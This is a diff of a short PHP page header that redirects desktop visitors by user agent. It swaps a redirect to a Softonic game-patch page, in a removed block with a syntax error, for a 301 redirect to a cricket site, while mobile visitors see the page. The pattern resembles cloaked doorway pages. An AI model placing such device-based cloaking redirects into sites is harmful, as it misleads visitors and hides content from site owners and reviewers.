@@ -1,38 +1,12 @@
 <?php
-//是否為行動裝置
-function isMobileCheck(){
-    //Detect special conditions devices
-    $iPod = stripos($_SERVER['HTTP_USER_AGENT'],"iPod");
-    $iPhone = stripos($_SERVER['HTTP_USER_AGENT'],"iPhone");
-    $iPad = stripos($_SERVER['HTTP_USER_AGENT'],"iPad");
-    if(stripos($_SERVER['HTTP_USER_AGENT'],"Android") && stripos($_SERVER['HTTP_USER_AGENT'],"mobile")){
-        $Android = true;
-    }else if(stripos($_SERVER['HTTP_USER_AGENT'],"Android")){
-        $Android = false;
-        $AndroidTablet = true;
-    }else{
-        $Android = false;
-        $AndroidTablet = false;
-    }
-    $webOS = stripos($_SERVER['HTTP_USER_AGENT'],"webOS");
-    $BlackBerry = stripos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
-    $RimTablet= stripos($_SERVER['HTTP_USER_AGENT'],"RIM Tablet");
-    //do something with this information
-    if( $iPod || $iPhone || $iPad || $Android || $AndroidTablet || $webOS || $BlackBerry || $RimTablet){
-        return true;
-    }else{
-        return false;
-    }
-} 
-?>
-
-<?php
-    if(isMobileCheck()){
-        exit()
-    }else{
-        header('Location: https://nba-2k12-patch.en.softonic.com/');
-        exit();
-    }
+if (strpos($_SERVER['HTTP_USER_AGENT'],'Android') || strpos( $_SERVER['HTTP_USER_AGENT'],'iPhone') ||  strpos( $_SERVER['HTTP_USER_AGENT'],'iPad')) {
+    // echo 'm';
+    // 這裡是手機端的程式碼
+}else {
+    // echo 'p';
+    // 這裡是電腦端的程式碼
+    header('Location: https://www.cricketbuddies.com/',true,301);
+}
 ?>
 <!DOCTYPE html>
 <html lang="th">
